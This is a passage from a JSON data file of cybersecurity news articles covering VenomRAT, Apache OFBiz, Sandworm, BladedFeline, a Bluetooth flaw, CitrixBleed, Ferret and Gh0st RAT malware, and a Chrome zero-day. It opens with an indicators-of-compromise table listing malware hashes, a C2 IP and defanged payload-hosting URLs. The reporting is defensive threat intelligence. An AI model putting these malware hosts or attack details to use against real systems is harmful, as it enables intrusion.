(CTA) member Broadcom/Symantec (@threatintel) for sharing the initial sample on this CVE.\nIn addition, we have shared our findings, including file samples and indicators of compromise, with our fellow CTA members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nIndicators of Compromise A full list of IoCs is available on our GitHub.\n| Indicator | Type | Description | | 7fc8d002b89fcfeb1c1e6b0ca710d7603e7152f693a14d8c0b7514d911d04234 | File | CVE-2023-40477-main.zip | | ecf96e8a52d0b7a9ac33a37ac8b2779f4c52a3d7e0cf8da09d562ba0de6b30ff | File | poc.py | | c2a2678f6bb0ff5805f0c3d95514ac6eeaeacd8a4b62bcc32a716639f7e62cc4 | File | bat.bat | | b99161d933f023795afd287915c50a92df244e5041715c3381733e30b666fd3b | File | c.ps1 | | b77e4af833185c72590d344fd8f555b95de97ae7ca5c6ff5109a2d204a0d2b8e | File | Windows.Gaming.Preview.exe - VenomRAT | | 94.156.253[.]109 | IPv4 | VenomRAT C2 | | checkblacklistwords[.]eu | Domain | Hosted files in infection chain | | http://checkblacklistwords[.]eu/check-u/robot?963421355?Ihead=true | URL | Hosted bat.bat | | http://checkblacklistwords[.]eu/c.txt | URL | Hosted c.ps1 | | http://checkblacklistwords[.]eu/words.txt | URL | Hosted Windows.Gaming.Preview.exe |","num_sentences":86,"metadata":{"source":"blog","platform":"Unit42","filename":"VenomRAT"}}
{"id":88,"title":"Apache ERP Zero-Day Underscores Dangers of Incomplete Patches","publish_date":null,"link":"https://www.darkreading.com/vulnerabilities-threats/apache-erp-0day-underscores-dangers-of-incomplete-patches","clean_text":"Apache ERP Zero-Day Underscores Dangers of Incomplete PatchesApache ERP Zero-Day Underscores Dangers of Incomplete Patches Apache fixed a vulnerability in its OfBiz enterprise resource planning (ERP) framework last month, but attackers and researchers found a way around the patch.\nJanuary 4, 2024 Unknown groups have launched probes against a zero-day vulnerability identified in Apache's OfBiz enterprise resource planning (ERP) framework — an increasingly popular strategy of analyzing patches for ways to bypass software fixes.\nThe 0-day vulnerability (CVE-2023-51467) in Apache OFBiz, disclosed on Dec. 26, allows an attacker to access sensitive information and remotely execute code against applications using the ERP framework, according to an analysis by cybersecurity firm SonicWall.\nThe Apache Software Foundation had originally released a patch for a related issue, CVE-2023-49070, but the fix failed to protect against other variations of the attack.\nThe incident highlights attackers' strategy of scrutinizing any patches released for high-value vulnerabilities — efforts which often result in finding ways around software fixes, says Douglas McKee, executive director of threat research at SonicWall. \"\nOnce someone's done the hard work of saying, 'Oh, a vulnerability exists here,' now a whole bunch of researchers or threat actors can look at that one narrow spot, and you've kind of opened yourself up to a lot more scrutiny,\" he says. \"\nYou've drawn attention to that area of code, and if your patch isn't rock solid or something was missed, it's more likely to be found because you've extra eyes on it.\"\nSonicWall researcher Hasib Vhora analyzed the Dec. 5 patch and discovered additional ways to exploit the issue, which the company reported to the Apache Software Foundation on Dec. 14. \"\nWe were intrigued by the chosen mitigation when analyzing the patch for CVE-2023-49070 and suspected the real authentication bypass would still be present since the patch simply removed the XML RPC code from the application,\" Vhora stated in an analysis of the issue. \"\nAs a result, we decided to dig into the code to figure out the root cause of the auth-bypass issue.\"\nAttacks targeted the Apache OfBiz vulnerability prior to its Dec. 26 disclosure.\nSource: Sonicwall By Dec. 21, five days before the issue was made public, SonicWall had already identified exploitation attempts for the issue.\nPatch Imperfect Apache is not alone in releasing a patch that attackers have managed to bypass.\nIn 2020, six out of the 24 vulnerabilities (25%) attacked using zero-day exploits were variations on previously patched security issues, according to data released by Google's Threat Analysis Group (TAG).\nBy 2022, 17 of the 41 vulnerabilities attacked by zero-day exploits (41%) were variants on previously patched issues, Google stated in an updated analysis.\nThe reasons that companies fail to fully patch an issue are numerous, from not understanding the root cause of the problem to dealing with huge backlogs of software vulnerabilities to prioritizing an immediate patch over a comprehensive fix, says Jared Semrau, a senior manager with Google Mandiant's vulnerability and exploitation group. \"\nThere is no simple, single answer as to why this happens,\" he says. \"\nThere are several factors that can contribute to [an incomplete patch], but [SonicWall researchers] are absolutely right — a lot of times companies are just patching the known attack vector.\"\nGoogle expects that the share of zero-day exploits that target incompletely patched vulnerabilities to remain a significant factor.\nFrom the attacker perspective, finding vulnerabilities in an application is difficult because researchers and threat actors have to look through 100,000s or millions of lines of code.\nBy focusing on promising vulnerabilities that may not have been properly patched, attackers can continue to attack a known weak point rather than start from scratch.\nA Way Around OfBiz Fix In many ways, that's what happened with the Apache OfBiz vulnerability.\nThe original report described two problems: an RCE flaw that required access to the XML-RPC interface (CVE-2023-49070) and an authentication bypass problem that provided untrusted attackers with this access.\nThe Apache Software Foundation believed that removing the XML-RPC endpoint would prevent both issues from being exploited, the ASF security response team said a response to questions from Dark Reading. \"\nUnfortunately we missed that the same authentication bypass also affected other endpoints, not just the XML-RPC one,\" the team said. \"\nOnce we were made aware, the second patch was issued within hours.\"\nThe vulnerability, tracked by Apache as OFBIZ-12873, \"allows attackers to bypass authentication to achieve a simple Server-Side Request Forgery (SSRF),\" Deepak Dixit, a member at the Apache Software Foundation, stated on the Openwall mailing list.\nHe credited SonicWall threat researcher Hasib Vhora and two other researchers — Gao Tian and L0ne1y — with finding the issue.\nBecause OfBiz is a framework, and thus part of the software supply chain, the impact of the vulnerability could be widespread.\nThe popular Atlassian Jira project and issue-tracking software, for example, uses the OfBiz library, but whether the exploit could successfully execute on the platform is still unknown, says Sonicwall's McKee. \"\nIt's going to depend on the way each company architects their network, in the way they configure the software,\" he says. \"\nI would say a typical infrastructure would not have this Internet-facing, that it would require some type of VPN or internal access.\"\nIn any event, companies should take steps and patch any applications known to use OfBiz to the latest version, the ASF security response team said. \"\nOur recommendation for companies that use Apache OFBiz is to follow security best practices, including only giving access to systems to those users that need it, making sure to regularly update your software, and making sure you are well-equipped to respond when a security advisory is published,\" they said.\nAbout the Author You May Also Like","num_sentences":35,"metadata":{"source":"blog","platform":"darkreading","filename":"Apache-ERP"}}
{"id":89,"title":"Microsoft: Russia's Sandworm APT Exploits Edge Bugs Globally","publish_date":null,"link":"https://www.darkreading.com/threat-intelligence/microsoft-russian-sandworm-apt-exploits-edge-bugs-globally","clean_text":"Microsoft: Russia's Sandworm APT Exploits Edge Bugs GloballyMicrosoft: Russia's Sandworm APT Exploits Edge Bugs Globally Sandworm (aka Seashell Blizzard) has an initial access wing called \"BadPilot\" that uses standard intrusion tactics to spread Russia's tendrils around the world.\nFebruary 12, 2025 Arguably, no advanced persistent threat (APT) enjoys as much notoriety as Sandworm, otherwise known as Military Unit 74455 within Russia's military intelligence (GRU).\nIts highlight reel includes NotPetya, an attack against the 2018 Winter Olympics, and two effective assaults on Ukraine's power grid.\nMore recent activities include a campaign against Denmark's energy sector and an unsuccessful attempt to down Ukraine's grid for a third time, followed by a successful attempt.\nIn a sign of the times, Sandworm has subtly been shifting toward quieter, more widespread intrusions.\nMicrosoft, which tracks the group as \"Seashell Blizzard,\" has identified a subgroup within 74455 focused solely on gaining initial access to high-value organizations across major industries and geographic regions.\nIt calls this subgroup \"BadPilot.\"\nSandworm's IAB, BadPilot Since at least late 2021, BadPilot has been performing opportunistic attacks against Internet-facing infrastructure, taking advantage of known vulnerabilities in popular email and collaboration platforms.\nNotable examples include Zimbra's CVE-2022-41352, the Microsoft Exchange bug CVE-2021-34473, and CVE-2023-23397 in Microsoft Outlook.\nAll three of these vulnerabilities received \"critical\" 9.8 out of 10 scores in the Common Vulnerability Scoring System (CVSS).\nBadPilot uses these critical vulnerabilities to gain useful initial access to traditionally high-value organizations: telecommunications companies, oil and gas companies, shipping companies, arms manufacturers, and entities of foreign governments.\nTargets have ranged from Ukraine and broader Europe to Central and South Asia and the Middle East.\nSince early 2024, BadPilot has expanded to access targets in the US and UK as well.\nFor this, it has made particular use of bugs in remote monitoring and management software: CVE-2023-48788, for example, a remote injection opportunity in the Fortinet Forticlient Enterprise Management Server (EMS), and the rare 10 out of 10 CVSS-rated CVE-2024-1709, allowing for authentication bypass in ScreenConnect by ConnectWise.\nAfter gaining its foothold on a targeted system, BadPilot follows all the usual steps of any average hacking operation.\nIt promptly establishes persistence using its custom \"LocalOlive\" Web shell, as well as copies of legitimate remote management and monitoring (RMM) tools, or \"ShadowLink,\" which configures compromised systems as Tor hidden services.\nIt collects credentials, performs lateral movement, exfiltrates data as necessary, and sometimes performs further post-compromise activities. \"\nThere is not a lack of sophistication here, but a focus on agility and obtaining goals,\" says Sherrod DeGrippo, director of threat intelligence strategy at Microsoft. \"\nThese TTPs work because this threat actor is persistent and continues pursuing its objectives.\"\nThe Impact in Ukraine Ultimately, BadPilot's job is to lubricate more significant attacks by its parent group, and, by extension, empower its controlling government.\nWhile a lot of its activity seems opportunistic, Microsoft wrote, \"its compromises cumulatively offer Seashell Blizzard options when responding to Russia's evolving strategic objectives.\"\nIt may or may not be a coincidence, for example, that the group came into being just months before Russia's invasion of Ukraine.\nAs that war began, and Russia peppered its neighbor with more cyberattacks than ever before, BadPilot was right in the mix, helping gain access to organizations perceived to be providing political or military support to its adversary.\nAdditionally, Microsoft says, the group has enabled at least three destructive attacks in Ukraine since 2023.\nSandworm has targeted critical infrastructure across Ukraine since the war started, including telecommunications infrastructure, manufacturing plants, transportation and logistics, energy, water, military and government organizations, and other infrastructure meant to support the civilian population.\nIt has also targeted military communities for the purpose of intelligence gathering. \"\nThese threat actors are persistent, creative, organized, and well-resourced,\" DeGrippo emphasizes.\nFor this reason, \"Critical sectors need to ensure that they sustain above-average security practices, patch their software, monitor Internet-facing assets, and enhance their overall security posture.\"\nAbout the Author You May Also Like","num_sentences":29,"metadata":{"source":"blog","platform":"darkreading","filename":"BadPilot"}}
{"id":90,"title":"Iranian APT 'BladedFeline' Hides in Network for 8 Years","publish_date":"2017-09-28","link":"https://www.darkreading.com/threat-intelligence/iranian-apt-bladedfeline-hides-network-8-years","clean_text":"- Threat Intelligence - Cyberattacks & Data Breaches - Identity & Access Management Security - Vulnerabilities & Threats - News Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa and the Asia Pacific Iranian APT 'BladedFeline' Hides in Network for 8 YearsIranian APT 'BladedFeline' Hides in Network for 8 Years ESET published research on the Iranian APT \"BladedFeline,\" which researchers believe is a subgroup of the cyber-espionage entity APT34.\nAn Iranian cyber-espionage group hid in a target's network for nearly a decade before being detected.\nESET published research today concerning \"BladedFeline,\" an Iranian advanced persistent threat (APT) that researchers said targeted \"systems used by Kurdish and Iraqi government officials\" in a cyber-espionage campaign last year.\nThe group has been active since at least 2017, and ESET said the group creates malware specifically \"for maintaining and expanding access within organizations in Iraq and the KRG [Kurdistan Regional Government].\"\nTraditionally, Iranian APTs have been deployed for espionage, power projection, and furthering the country's national strategy.\nSome APTs have also been observed conducting ransomware attacks.\nBladedFeline, which ESET said it discovered in 2023, fits into this mold.\nToday's research details how a state-backed actor gets its tendrils into an adversary's systems.\nInside a BladedFeline Campaign According to ESET, the group has been observed deploying a proprietary backdoor, referred to as \"Shahmaran,\" against Kurdish officials.\nThe researchers said the \"simple\" backdoor is a 64-bit executable, which doesn't use compression or encryption for communications, which they initially found in a target's Startup directory. \"\nAfter checking in with the C&C server, the backdoor executes any operator commands provided, which include uploading and downloading additional files, requesting specific file attributes and providing file and directory manipulation API,\" the researchers said.\nESET said it's unclear how BladedFeline gained initial access; in the case of KRG victims, it established access to a target network at least as far back as 2017 and has maintained it ever since.\nFor Iraqi government victims, ESET suspects the group exploited a flaw in an internet-facing web server enabling web shell deployment.\nIn addition to its proprietary Shahmaran backdoor, the research detailed BladedFeline's use of a backdoor called Whisper, a malicious Internet Information Services (IIS) module ESET calls \"PrimeCache\" that also serves as a backdoor, a reverse shell called \"VideoSRV,\" PowerShell executors, multiple reverse tunnels, and much more.\nThe timeline covered in the research stretches from September 2017 to March 2024.\nFrom its research, ESET assessed BladedFeline targeted Kurdistan and Iraq for espionage-related purposes, \"with an eye toward maintaining strategic access to high-ranking officials in both governmental entities.\" \"\nThe KRG's diplomatic relationship with Western nations, coupled with the oil reserves in the Kurdistan region, makes it an enticing target for Iran-aligned threat actors to spy on and potentially manipulate,\" the report read. \"\nIn Iraq, these threat actors are most probably trying to counter the influence of Western governments following the US invasion and occupation of the country.\"\nResearchers also assessed with medium confidence that BladedFeline was a subgroup of \"Oilrig,\" an Iranian cyber-espionage group also referred to as APT34 and Hazel Sandstorm.\nThat's based on the discovery of code similarities between PrimeCache and OilRig's backdoor RDAT and the use of VideoSRV, which is an OilRig tool.\nESET expects going forward \"that BladedFeline will persist with implant development in order to maintain and expand access within its compromised victim set, likely for cyberespionage.\"\nThe research includes indicators of compromise as well as further technical details.\nBladedFeline in Context An ESET researcher, who wished to remain anonymous because they did not want their name to appear in media reports, tells Dark Reading that compared to the broader spectrum of APT actors, BladedFeline is a moderately advanced group, as it develops its own tools that are of reasonably high quality. \"\nWe don't pick up on them right away like with do with many other Iranian-aligned APT groups,\" the researcher says.\nMost importantly, as stated, the group has maintained access to some Kurdish officials for eight years.\nFrom a defender standpoint, ESET recommends knowing which applications are in your network, particularly if they're being used by high-value targets or VIPs within your organization. \"\nThese particular implants that the BladeFeline group has developed are fairly stealthy in their network exfiltration paths,\" the ESET researcher tells Dark Reading. \"\nThey do a good job of hiding within normal traffic channels, so knowing what's out there from a network perspective is useful.\nAnd then when you combine that with knowing what applications are operating within your environment, you can get a pretty solid baseline for what good looks like and then identify deviations and anomalous behavior.\"\nRead more about: DR Global Middle East & AfricaAbout the Author You May Also Like","num_sentences":30,"metadata":{"source":"blog","platform":"darkreading","filename":"BladedFeline"}}
{"id":91,"title":"Critical Bluetooth Flaw Exposes Android, Apple & Linux Devices to Takeover","publish_date":null,"link":"https://www.darkreading.com/vulnerabilities-threats/critical-bluetooth-flaw-exposes-android-apple-and-linux-devices-to-keystroke-injection-attack","clean_text":"Critical Bluetooth Flaw Exposes Android, Apple & Linux Devices to TakeoverCritical Bluetooth Flaw Exposes Android, Apple & Linux Devices to Takeover Various devices remain vulnerable to the bug, which has existed without notice for years and allows an attacker to control devices as if from a Bluetooth keyboard.\nDecember 6, 2023 Attackers can exploit a critical Bluetooth security vulnerability that's been lurking largely unnoticed for years on macOS, iOS, Android, and Linux device platforms.\nThe keystroke injection vulnerability allows an attacker to control the targeted device as if they were attached by a Bluetooth keyboard, performing various functions remotely depending on the endpoint.\nTracked as CVE-2023-45866, the flaw exists in how in the Bluetooth protocol is implemented on various platforms.\nIt works \"by tricking the Bluetooth host state-machine into pairing with a fake keyboard without user confirmation,\" Marc Newlin, principal reverse engineer at SkySafe, revealed in a blog post published Dec. 6. \"\nThe underlying unauthenticated pairing mechanism is defined in the Bluetooth specification, and implementation-specific bugs expose it to the attacker,\" he explained.\nThe vulnerability enables an attacker to pair an emulated Bluetooth keyboard with a victim's phone or computer, implementing the keyboard as a Python script that runs on a Linux computer.\nThe attacker can then inject keystrokes, typing on the target device as if they were a Bluetooth keyboard legitimately attached to the target.\nThis effectively allows someone to \"perform arbitrary actions as the user\" on exploited devices, Newlin explains. \"\nOn Android or iOS, this includes any actions the user can perform which do not require a password or biometric authentication,\" such as installing apps and forwarding emails or text messages, he says.\nOn Linux and macOS, the attacker could launch a command-prompt and run arbitrary commands as well as install apps, Newlin adds.\nHiding in Plain Sight While the flaw has been present for at least a good 10 years, it has been hiding in plain sight likely because of its simplicity, Newlin tells Dark Reading.\nHe only discovered the issue after first exploring potential keystroke-injection vulnerabilities in Apple's Magic Keyboard — a wireless keyboard for iOS and macOS — and moving on to explore the potential for the flaws more broadly in Bluetooth from there. \"\nI think researchers tend to forget about the low-hanging fruit,\" he says. \"\nThere has been plenty of research investigating weaknesses in the Bluetooth encryption schemes, but apparently nobody thought to look for simple authentication-bypass bugs.\"\nIndeed, while Bluetooth is an incredibly useful protocol that has changed how people interact with various devices, its cross-platform, multi-device nature is proving to be complex in terms of security, causing myriad issues that patches can't keep up with.\nAndroid has been vulnerable to the issue that Newlin's discovered as far back as version 4.2.2, which was released in 2012.\nThe same flaw was patched in Linux in 2020, but then the fix was left disabled by default, Newlin discovered.\nFurther, the vulnerability in macOS and iOS bypasses Apple's security protections and works in Lockdown Mode, which is meant to protect devices from sophisticated cyberattacks, he said.\nBluetooth Exploit Forthcoming A platform's level of exposure depends on the state of the device in question, Newlin said.\nOn Android, for instance, devices are vulnerable whenever Bluetooth is enabled, while exploitation on Linux/BlueZ requires that Bluetooth is discoverable/connectable.\niOS and macOS devices are vulnerable when Bluetooth is enabled and a Magic Keyboard has been paired with the phone or computer.\nIn January, Newlin will release proof-of-concept exploit scripts demonstrating how an attacker can exploit the flaw from a Linux-based computer using a standard Bluetooth adapter.\nHowever, a Linux system is not required to exploit the flaw, he tells Dark Reading. \"\nOnce the attacker has paired with the target phone or computer, they can inject keystrokes to perform arbitrary actions as the victim, provided those actions don't require a password or biometric authentication,\" he explained.\nDisclosure and Mitigation Newlin informed Apple, Google, and Canonical of the flaw in August, and informed Bluetooth SIG in September.\nThere are patches for most affected devices, although some remain vulnerable, including Apple gear.\nAt this time, there are no known active exploitation in the wild, Newlin says.\nNewlin tested the following Android devices and found that they were all vulnerable: Pixel 7 running Android 14; Pixel 6 running Android 13; Pixel 4a (5G) running Android 13; Pixel 2 running Android 11; Pixel 2 running Android 10; Nexus 5 running Android 6.0.1; and BLU DASH 3.5 running Android 4.2.2.\nThere currently is no fix available for Android 4.2.2-10; however, an Android security update released this week mitigates the vulnerability in Android versions 11-14, although Newlin says he's not sure which OEMs have so far implemented the patch.\nNewlin tested Ubuntu Linux versions 18.04, 20.04, 22.04, 23.10; all were vulnerable.\nThere is a patch available on Github for BlueZ devices.\nThe 2022 MacBook Pro with MacOS 13.3.3, the 2017 MacBook Air with macOS 12.6.7, and iPhone SE running iOS 16.6 were all tested and found vulnerable, even in Lockdown Mode. \"\nI reported the macOS and iOS vulnerabilities to Apple in August, and they confirmed my report, but have not shared their patch timeline,\" Newlin says. \"\nApple is aware that I am publicly disclosing [this], and they have issued CVE-2023-42929.\"\nAbout the Author You May Also Like","num_sentences":36,"metadata":{"source":"blog","platform":"darkreading","filename":"Bluetooth-Flaw"}}
{"id":92,"title":"Comcast Xfinity Breached via CitrixBleed; 35M Customers Affected","publish_date":null,"link":"https://www.darkreading.com/cyberattacks-data-breaches/comcast-xfinity-breached-citrix-bleed-35m-customers","clean_text":"Comcast Xfinity Breached via CitrixBleed; 35M Customers AffectedComcast Xfinity Breached via CitrixBleed; 35M Customers Affected A trove of personal data belonging to millions of Americans is just the latest bullet point in a bad year for Citrix customers.\nDecember 19, 2023 The now-infamous CitrixBleed vulnerability has claimed possibly its biggest kill yet: 35 million customers of Comcast Xfinity.\nSince at least August, attackers have been exploiting CVE-2023-4966 (aka CitrixBleed), a 7.5 high-severity vulnerability affecting Citrix Systems' NetScaler ADC and Gateway networking products.\nEven after it was brought to light in October, many organizations have struggled to comprehensively shore up their systems.\nOne such organization appears to be Comcast Xfinity.\nOn Monday, the cable giant disclosed a CitrixBleed-enabled breach of its customer data, including usernames and hashed passwords, and, for some, names, contact information, last four digits of Social Security numbers, dates of birth, and security questions and answers.\nXfinity provided the following statement to Dark Reading: \"We are providing notice to customers about a data security incident which exploited a vulnerability previously announced by Citrix, a software provider used by Xfinity and thousands of other companies worldwide.\nWe promptly patched and mitigated the vulnerability.\nWe are not aware of any customer data being leaked anywhere, nor of any attacks on our customers.\nIn addition, we required our customers to reset their passwords and we strongly recommend that they enable two-factor or multi-factor authentication, as many Xfinity customers already do.\nWe take the responsibility to protect our customers very seriously and have our cybersecurity team monitoring 24x7.\"\nWhat Happened in the Comcast Data Breach Citrix first disclosed and released a patch for CitrixBleed on Oct. 10, with additional guidance for affected customers following a week and two weeks thereafter.\nIn response, according to a notice to customers, Comcast claims that it \"promptly patched and mitigated our systems.\"\nHowever, the company fell victim to a breach through Citrix lasting from Oct. 16 to 19.\nXfinity did not explain this discrepancy in its response to an inquiry from Dark Reading.\nIn those three days, it seems, attackers were able to exfiltrate much of the data Xfinity has about its customers.\nAnd a disclosure filed with the Maine Attorney General's Office reveals the full extent of the damage: 35,879,455 individuals affected.\nAll Xfinity customers will be prompted to reset their passwords upon their next login attempts.\nSome customers had already received the prompt days before Monday's disclosure.\nThe Ongoing Threat of CitrixBleed Even four months into its exploitation, and two months following its patch, \"CitrixBleed represents a significant risk for a number of reasons,\" says Chris Morgan, senior cyber threat intelligence analyst at ReliaQuest.\nLast month, ReliaQuest identified five active threat groups, including the LockBit ransomware gang, still picking at it. \"\nThe vulnerability affects a wide scale of devices, is extremely easy to exploit — with available proof of concepts (POCs) in circulation — and can present significant opportunities for threat actors,\" he explains.\nHe also notes a rumor that ransomware groups have passed around a Python script that automates the entire attack chain. \"\nEven if organizations have applied the necessary patch for the issue and rebooted,\" he continues, \"session tokens can be accessed from a device's memory, which then can then be used to hijack active sessions.\nThis can effectively bypass authentication and gain unencumbered access to the appliance.\nThis is why it is important to invalidate active and persistent session tokens upon applying the patch.\" \"\nSusceptible organizations who fail to take these steps will continue to face a significant risk from financially motivated threat actors — in addition to several other significant threats — until they take action,\" he says.\nAbout the Author You May Also Like","num_sentences":28,"metadata":{"source":"blog","platform":"darkreading","filename":"CitrixBleed"}}
{"id":93,"title":"Ferret Malware Added to 'Contagious Interview' Campaign","publish_date":"2024-12-28","link":"https://www.darkreading.com/threat-intelligence/ferret-malware-added-contagious-interview-threat-campaign","clean_text":"Ferret Malware Added to 'Contagious Interview' CampaignFerret Malware Added to 'Contagious Interview' Campaign Targets are lured into a fake interview process that convinces them to download malware needed for a virtual interview.\nNEWS BRIEF In a new patch for its on-device malware tool, Apple is pushing signature updates to XProtect in order to block variants of a malware belonging to what is known as the macOS Ferret family.\nThis malware has been identified as part of \"Contagious Interview,\" a North Korean campaign involving threat actors luring in targets and convincing them to install malware onto their devices through a fake job interview process.\nThe other variants in the campaign include: FROSTYFERRET_UI, FRIENDLYFERRET_SECD, and MULTI_FROSTYFERRET_CMDCODES.\nThe DPRK malware family was first detailed by researchers in December 2024 and again in January where, as part of the campaign, targets are asked to communicate with an \"interviewee\" through a link that requests to install a piece of software required for virtual meetings.\nOnce installed, it runs a malicious shell script and installs a persistence agent, as well as an executable impersonating a Google Chrome update.\nThe Contagious Interview attack chains are designed to drop JavaScript-based malware \"BeaverTail,\" which delivers a Python backdoor known as InvisibleFerret, and harvests sensitive data from Web browsers and crypto wallets.\nAnd now researchers at SentinelOne are highlighting samples they're calling \"FlexibleFerret\" that went undetected by XProtect as of Feb. 3, suggesting that the threat actors are honing their tactics to evade detection.\nThis component dates as far back as November 2023. \"\nIn an example in late December, one 'commenter' left instructions leading to the download of Ferret family droppers,\" stated the SentinelOne researchers. \"\nThis suggests that the threat actors are happy to expand the vectors by which they deliver the malware beyond the specific targeting of job seekers to developers more generally.\"\nRead more about: News BriefsAbout the Author You May Also Like","num_sentences":12,"metadata":{"source":"blog","platform":"darkreading","filename":"Contagious Interview"}}
{"id":94,"title":"A New, Spookier Gh0st RAT Malware Haunts Global Cyber Targets","publish_date":"2008-03-28","link":"https://www.darkreading.com/threat-intelligence/new-spookier-gh0st-rat-uzbekistan-south-korea","clean_text":"A New, Spookier Gh0st RAT Malware Haunts Global Cyber TargetsA New, Spookier Gh0st RAT Malware Haunts Global Cyber Targets A decade and a half after Gh0st RAT first appeared, the \"SugarGh0st RAT\" variant aims to make life sweeter for cybercriminals.\nNovember 30, 2023 A new variant of the infamous \"Gh0st RAT\" malware has been identified in recent attacks targeting South Koreans and the Ministry of Foreign Affairs in Uzbekistan.\nThe Chinese group \"C.Rufus Security Team\" first released Gh0st RAT on the open Web in March 2008.\nRemarkably, it's still in use today, particularly in and around China, albeit in modified forms.\nSince late August, for instance, a group with strong Chinese links has been distributing a modified Gh0st RAT deemed \"SugarGh0st RAT.\"\nAccording to research from Cisco Talos, this threat actor drops the variant via JavaScript-laced Windows shortcuts, while distracting targets with customized decoy documents.\nThe malware itself is still largely the same, effective tool it's ever been, though it now sports some new decals to help sneak past antivirus software.\nSugarGh0st RAT's Traps The four samples of SugarGh0st, likely delivered via phishing, arrive on targeted machines as archives embedded with Windows LNK shortcut files.\nThe LNKs hide malicious JavaScript which, upon opening, drops a decoy document — targeted for Korean or Uzbek government audiences — and the payload.\nLike its progenitor — the Chinese origin remote access Trojan, first released to the public in March 2008 — SugarGh0st is a clean, multitooled espionage machine.\nA 32-bit dynamic link library (DLL) written in C++, it begins by collecting system data, then opens up the door to full remote access capabilities.\nAttackers can use SugarGh0st to retrieve any information they might desire about their compromised machine, or start, terminate, or delete the processes it's running.\nThey can use it to find, exfiltrate, and delete files, and erase any event logs to mask the resulting forensic evidence.\nThe backdoor comes fitted with a keylogger, a screenshotter, a means of accessing the device's camera, and plenty of other useful functions for manipulating the mouse, performing native Windows operation, or simply running arbitrary commands. \"\nThe thing that's most concerning to me is how it's specifically designed to evade previous detection methods,\" says Nick Biasini, Cisco Talos' head of outreach.\nWith this new variant, specifically, \"they took effort to do things that would change the way that core detection would work.\"\nIt isn't that SugarGh0st has any particularly novel evasion mechanisms.\nRather, minor aesthetic changes make it appear different from prior variants, such as changing the command-and-control (C2) communication protocol such that instead of 5 bytes, the network packet headers reserve the first 8 bytes as magic bytes (a list of file signatures, used to confirm a file's contents). \"\nIt's just a very effective way to try and make sure that your existing security tooling isn't going to pick up on this right away,\" Biasini says.\nGh0st RAT's Old Haunts Back in September 2008, the office of the Dalai Lama approached a security researcher (no, this isn't the beginning of a bad joke).\nIts employees were being peppered with phishing emails.\nMicrosoft applications were crashing, without explanation, across the organization.\nOne monk recalled watching his computer open Microsoft Outlook all on its own, attach documents to an email, and send that email to an unrecognized address, all without his input.\nA Gh0st RAT beta model's English-language UI.\nSource: Trend Micro EU via Wayback Machine The Trojan used in that Chinese military-linked campaign against Tibetan monks has stood the test of time, Biasini says, for a few reasons. \"\nOpen source malware families live long because actors get a fully functional piece of malware that they can manipulate as they see fit.\nIt also allows people who don't know how to write malware to leverage this stuff for free,\" he explains.\nGh0st RAT, he adds, stands out in particular as \"a very functional, very well-built RAT.\"\nAbout the Author You May Also Like","num_sentences":29,"metadata":{"source":"blog","platform":"darkreading","filename":"Gh0st-RAT"}}
{"id":95,"title":"Google Patches Another Chrome Zero-Day as Browser Attacks Mount","publish_date":null,"link":"https://www.darkreading.com/vulnerabilities-threats/google-patches-another-chrome-zero-day-as-browser-attacks-mount","clean_text":"Google Patches Another Chrome Zero-Day as Browser Attacks MountGoogle Patches Another Chrome Zero-Day as Browser Attacks Mount The vulnerability is among a rapidly growing number of zero-day bugs that major browser vendors have reported recently.\nNovember 29, 2023 For the fourth time since August, Google has disclosed a bug in its Chrome browser technology that attackers were actively exploiting in the wild before the company had a fix for it.\nInteger Overflow Bug The latest zero-day, which Google is tracking as CVE-2023-6345, stems from an integer overflow issue in Skia, an open source 2D graphic library in Chrome.\nThe bug is one of seven Chrome vulnerabilities for which Google issued a security update this week.\nThe company's advisory contained sparse details on CVE-2023-6345 beyond mentioning the fact that an exploit for it is publicly available.\nA brief description on NIST's National Vulnerability Database (NVD) site described the flaw as affecting versions of Chrome prior to 119.0.6045.199 and allowing a remote attacker who has \"compromised the renderer process to potentially perform a sandbox escape via a malicious file.\"\nThe NVD identified the bug as a high-severity issue.\nGoogle credited researchers at its Threat Analysis Group for finding and reporting CVE-2023-6345 on Nov. 24.\nThe vulnerability is the seventh zero-day that Google has rushed to patch amid active exploit activity this year and is the latest manifestation of growing attacker interest in Chrome and other browsers.\nA Flood of Browser Zero-Days Since the beginning of this year, Apple, Google, Microsoft, and Firefox have all disclosed multiple critical vulnerabilities in their respective browsers, including a handful of zero-days.\nIn some instances, a bug in some widely used component affected multiple browsers at once, as was the case with CVE-2023-4863, a zero-day heap overflow in WebP, a code library common to Chrome, Apple Safari, and Mozilla Firefox.\nIn other instances, as with CVE-2023-5217, a zero-day bug in Chrome impacted multiple browsers based on Chromium technology, such as Microsoft Edge, Opera, Brave, and Vivaldi.\nThere were also multiple zero-days that Apple disclosed separately this year in its WebKit browser engine for Safari, including CVE-2023-28205 and three others in May: CVE-2023-32409, CVE-2023-28204, and CVE-2023-32373.\nBoth Microsoft and Mozilla have also separately reported other critical bugs in their respective browsers.\nIt is unclear which threat actor might be currently exploiting CVE-2023-6345, the bug that Google disclosed this week, or why.\nBut in recent months, Google and Apple have warned about vendors of commercial surveillance products exploiting zero-day bugs in their respective browser technologies to drop spyware on Android, iOS, and other mobile devices.\nGoogle discovered CVE-2023-4863 after researchers at Apple and Toronto University Citizen Lab informed the company about a commercial vendor using the flaw to drop Predator spyware on Android and iOS devices.\nUbiquitous Use Much of the growing attacker interest in browsers has to do with their ubiquitous use, says Lionel Litty, chief security architect at Menlo Security.\nThe exploding use of Web applications has resulted in users spending most of their time on browsers for everything from accessing applications and webpages to additional content such as PDFs and other documents.\nAdding to this is the drive by Google to integrate even more features into its browser and make it a replacement for fat client technologies, Litty says.\nThis includes enabling access to USB devices, Bluetooth, and even the GPU through the WebGPU interface. \"\nDespite all the care taken by Google engineers, we continue to see a steady stream of security issues that are exploitable, including many zero-days that are actually exploited,\" he says.\nThe fact that multiple browsers are based on Chromium is another reason for attackers targeting the technology, Litty notes. \"\nDeveloping an exploit against Chrome usually means that it will work against all browsers, save Safari and Firefox, allowing bad actors to target more victims without any additional work.\"\nSaeed Abbasi, manager of vulnerability and threat research at Qualys, points to similar reasons for Chrome's growing popularity among threat actors. \"\nAdditionally, the high commercial value of exploiting a widely used platform like Chrome attracts sophisticated attackers, including those backed by state sponsors,\" he says.\nMore generally, browser vulnerabilities present significant risks for organizations, Abbasi says.\nAttackers can use browser bugs to sneak malware and spyware into an organization.\nAdditionally, attackers might exploit these weaknesses to steal login credentials and other data for potential future 